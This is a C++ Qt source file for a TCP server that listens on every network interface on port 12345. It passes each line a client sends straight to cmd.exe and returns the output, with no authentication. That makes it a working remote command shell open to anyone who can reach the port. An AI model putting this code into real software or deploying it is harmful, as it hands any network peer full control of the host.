#include "myserver.h"

MyServer::MyServer(QObject *parent) : QObject{parent}
{
    connect(&_server, &QTcpServer::newConnection, this, &MyServer::onNewConnection);
    connect(this, &MyServer::newMessage, this, &MyServer::onNewMessage);

    if(_server.listen(QHostAddress::Any, 12345)){
        qInfo() << "Listening...";
    }
}

void MyServer::onNewConnection()
{
    const auto client = _server.nextPendingConnection();
    if(client == nullptr){
        return ;
    }

    client->write("\n>>> ");
    client->flush();

    _clients.insert(this->getClientKey(client), client);
    std::cout << this->getClientKey(client).toStdString() + " connected\n";

    connect(client, &QTcpSocket::readyRead, this, &MyServer::onReadyRead);
    connect(client, &QTcpSocket::disconnected, this, &MyServer::onDisconnected);
}

void MyServer::onReadyRead()
{
    const auto client = qobject_cast<QTcpSocket*>(sender());
    if(client == nullptr){
        return ;
    }

    const QByteArray message = client->readAll();

    emit newMessage(client, message);
}

void MyServer::onNewMessage(QTcpSocket *client, const QByteArray &ba)
{
    if(ba.compare("\n") != 0){

        std::cout << this->getClientKey(client).toStdString() + ": "  + ba.toStdString();

        // Open cmd.exe and execute client command
        QProcess *process = new QProcess();
        process->start("cmd");
        process->waitForStarted();
        process->write(ba);
        process->closeWriteChannel();
        process->waitForFinished();

        // Trim header of Command Prompt and line after execution
        QString output = QString(process->readAllStandardOutput());
        output.remove(0, output.indexOf(ba.trimmed())+ba.length());
        output.remove(output.lastIndexOf("\r\n"), 1000);

        client->write(output.toLocal8Bit());
    }

    client->write("\n>>> ");
    client->flush();
}

void MyServer::onDisconnected()
{
    const auto client = qobject_cast<QTcpSocket*>(sender());
    if(client == nullptr){
        return ;
    }

    std::cout << this->getClientKey(client).toStdString() + " disconnected\n";
    _clients.remove(this->getClientKey(client));
}

QString MyServer::getClientKey(const QTcpSocket *client) const
{
    return client->peerAddress().toString().append(":").append(QString::number(client->peerPort()));
}
